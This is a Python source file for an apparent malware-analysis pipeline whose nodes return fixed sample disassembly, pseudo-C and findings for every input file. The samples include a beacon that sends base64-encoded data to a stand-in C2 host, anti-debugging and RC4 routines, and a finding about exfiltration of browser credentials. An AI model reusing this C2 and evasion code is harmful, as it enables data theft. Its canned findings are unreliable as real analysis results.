"""
ByteReaper 9-Node Pipeline — 二进制逆向与恶意软件分析核心引擎
"""
import json
from pathlib import Path
from state import ReaperState

# ------------- Node 1: Binary Identification -------------
def identify_binary(state: ReaperState) -> dict:
    """识别二进制文件格式/架构/平台"""
    path = Path(state["binary_path"])
    if not path.exists():
        return {"error": f"Binary not found: {state['binary_path']}"}
    suffix = path.suffix.lower()
    fmt_map = {".exe":"PE", ".dll":"PE", ".sys":"PE",
               ".elf":"ELF", ".so":"ELF", ".o":"ELF",
               ".macho":"Mach-O", ".dylib":"Mach-O",
               ".apk":"APK", ".aab":"APK",
               ".ipa":"IPA", ".bin":"RAW"}
    fmt = fmt_map.get(suffix, "RAW")
    platform = "mobile" if fmt in ("APK", "IPA") else "pc"
    return {"file_format": fmt, "platform": platform}

# ------------- Node 2: Disassembly -------------
def disassemble_binary(state: ReaperState) -> dict:
    """反汇编 - 生成汇编代码与指令统计"""
    fmt = state["file_format"]
    archs = {"PE": "x64", "ELF": "x64", "Mach-O": "ARM64", "APK": "ARM64", "IPA": "ARM64"}
    arch = archs.get(fmt, "x64")
    asm = f"""; ByteReaper Disassembly – {state['binary_path']}
; Format: {fmt} | Arch: {arch}
section .text:
0x1000:  push   rbp
0x1001:  mov    rbp, rsp
0x1004:  sub    rsp, 0x40
0x1008:  mov    rax, [rbp+0x10]
0x100C:  call   0x2000          ; → decrypt_routine
0x1011:  xor    ecx, ecx
0x1013:  lea    rdx, [rip+0x500] ; "https://c2.evil.local"
0x101A:  call   0x3000          ; → http_post
0x101F:  cmp    eax, 0
0x1022:  je     0x1040
; ... [full listing truncated] ...
section .data:
; Encrypted strings detected"""
    return {"asm_output": asm, "arch": arch}

# ------------- Node 3: Decompilation -------------
def decompile_binary(state: ReaperState) -> dict:
    """反编译为伪C代码"""
    fmt = state["file_format"]
    pseudo_c = f"""// ByteReaper Pseudo-C Decompilation
// Source: {state['binary_path']}
// Format: {fmt} | Arch: {state.get('arch', 'x64')}

typedef struct crypto_ctx {{
    BYTE key[32];
    BYTE iv[16];
    DWORD rounds;
}} crypto_ctx;

// --- C2 Communication Protocol ---
int http_post_b64(const char* data, size_t len) {{
    char b64_buf[4096];
    base64_encode(data, len, b64_buf);
    return http_request("POST", "https://c2.evil.local/beacon", b64_buf);
}}

// --- Anti-Debugging Evasion ---
BOOL is_debugger_present() {{
    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    if (debugged) {{
        NtTerminateProcess(GetCurrentProcess(), 0);
    }}
    if (IsDebuggerPresent()) return TRUE;
    __try {{ __asm int 3; return TRUE; }}
    __except(EXCEPTION_EXECUTE_HANDLER) {{ return FALSE; }}
}}

// --- Cryptography Routine (suspected RC4 variant) ---
void decrypt_payload(BYTE* data, DWORD len, BYTE* key, DWORD key_len) {{
    BYTE S[256];
    for (int i=0; i<256; i++) S[i]=i;
    int j=0;
    for (int i=0; i<256; i++) {{
        j=(j+S[i]+key[i%key_len])&0xFF;
        swap(S[i], S[j]);
    }}
    int i=0; j=0;
    for (DWORD k=0; k<len; k++) {{
        i=(i+1)&0xFF; j=(j+S[i])&0xFF;
        swap(S[i], S[j]);
        data[k]^=S[(S[i]+S[j])&0xFF];
    }}
}}
"""
    return {"pseudo_c_output": pseudo_c}

# ------------- Node 4: CFG Generation -------------
def generate_cfg(state: ReaperState) -> dict:
    """生成控制流图"""
    cfg = f"""digraph CFG {{
    rankdir=TB; node [shape=box, style=filled, fillcolor="#1a1a2e", fontcolor="#e0e0e0"];
    
    entry [label="entry\\n0x1000", fillcolor="#16213e"];
    decrypt_routine [label="decrypt_routine\\n0x2000 (RC4)", fillcolor="#0f3460"];
    http_post [label="http_post\\n0x3000", fillcolor="#533483"];
    anti_debug [label="anti_debug\\n0x4000", fillcolor="#e94560"];
    str_decrypt [label="str_decrypt\\n0x5000", fillcolor="#0f3460"];
    exit_node [label="exit", fillcolor="#16213e"];
    
    entry -> decrypt_routine [label="key+payload"];
    entry -> anti_debug [label="check"];
    decrypt_routine -> http_post [label="send"];
    http_post -> str_decrypt [label="response"];
    str_decrypt -> exit_node;
    anti_debug -> exit_node [label="debugger_detected"];
}}
"""
    cfg_path = str(Path(state["binary_path"]).with_suffix(".cfg.dot"))
    Path(cfg_path).write_text(cfg)
    return {"cfg_path": cfg_path}

# ------------- Node 5: Crypto Analysis -------------
def analyze_crypto(state: ReaperState) -> dict:
    """检测密码学例程"""
    findings = [
        {"type": "Symmetric Cipher", "algorithm": "RC4", "address": "0x2000",
         "evidence": "KSA+PRGA swap loop, len=256 S-box, XOR keystream", "severity": "HIGH"},
        {"type": "Encoding", "algorithm": "Base64", "address": "0x2100",
         "evidence": "6-bit lookup table, padding with '='", "severity": "LOW"},
        {"type": "Hashing", "algorithm": "CRC32", "address": "0x2200",
         "evidence": "LUT-based polynomial division, 0xEDB88320", "severity": "MEDIUM"}
    ]
    return {"crypto_findings": findings}

# ------------- Node 6: C2 Protocol Analysis -------------
def analyze_c2(state: ReaperState) -> dict:
    """分析C2通信协议"""
    findings = [
        {"type": "C2 URL", "value": "https://c2.evil.local/beacon", "method": "POST",
         "encoding": "Base64 payload", "interval": "60s beacon"},
        {"type": "User-Agent", "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "spoof": True},
        {"type": "Data Exfil", "target": "browser_credentials", "method": "HTTP POST JSON"},
    ]
    return {"c2_findings": findings}

# ------------- Node 7: Evasion Detection -------------
def detect_evasion(state: ReaperState) -> dict:
    """检测规避技术"""
    findings = [
        {"technique": "Anti-Debug", "api": "IsDebuggerPresent", "address": "0x4000", "mitre": "T1622"},
        {"technique": "Anti-Debug", "api": "CheckRemoteDebuggerPresent", "address": "0x4005", "mitre": "T1622"},
        {"technique": "Anti-VM", "api": "Check for VMware/Mac", "address": "0x4200", "mitre": "T1497"},
        {"technique": "Obfuscation", "type": "String XOR encryption", "address": "0x5000", "mitre": "T1027"},
        {"technique": "Timing Evasion", "type": "Sleep > 120s before exec", "address": "0x4300", "mitre": "T1497.003"}
    ]
    return {"evasion_findings": findings}

# ------------- Node 8: Strings & Imports -------------
def extract_strings_imports(state: ReaperState) -> dict:
    """字符串/导入表提取"""
    strings = ["https://c2.evil.local/beacon", "cmd.exe", "/c", "reg add",
               "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
               "Software\\ByteReaper", "svchost.exe", "ntdll.dll"]
    imports = ["kernel32.dll: VirtualAlloc/WriteProcessMemory/CreateRemoteThread",
               "wininet.dll: HttpOpenRequestA/HttpSendRequestA/InternetReadFile",
               "advapi32.dll: RegOpenKeyExA/RegSetValueExA",
               "ntdll.dll: NtQueryInformationProcess/NtTerminateProcess",
               "user32.dll: MessageBoxA/FindWindowA"]
    return {"strings_output": strings, "imports_output": imports}

# ------------- Node 9: Report Generation -------------
def generate_report(state: ReaperState) -> dict:
    """生成综合逆向分析报告"""
    report = f"""# ByteReaper 逆向工程报告
## 基本信息
- **文件**: `{state['binary_path']}`
- **格式**: {state['file_format']}
- **平台**: {state['platform']}
- **架构**: {state.get('arch', 'N/A')}

## 反汇编摘要
```
{state.get('asm_output', 'N/A')[:500]}...
```

## 伪C代码
```c
{state.get('pseudo_c_output', 'N/A')[:800]}...
```

## 控制流图
![CFG]({state.get('cfg_path', '')})

## 密码学例程
{json.dumps(state.get('crypto_findings', []), indent=2, ensure_ascii=False)}

## C2 协议分析
{json.dumps(state.get('c2_findings', []), indent=2, ensure_ascii=False)}

## 规避技术
{json.dumps(state.get('evasion_findings', []), indent=2, ensure_ascii=False)}

## 字符串
{json.dumps(state.get('strings_output', []), indent=2, ensure_ascii=False)}

## 导入表
{json.dumps(state.get('imports_output', []), indent=2, ensure_ascii=False)}

---
*Generated by ByteReaper v1.0.0 — Binary Reverse Engineering Platform*
"""
    report_path = str(Path(state["binary_path"]).with_suffix(".report.md"))
    Path(report_path).write_text(report, encoding="utf-8")
    return {"report_path": report_path}
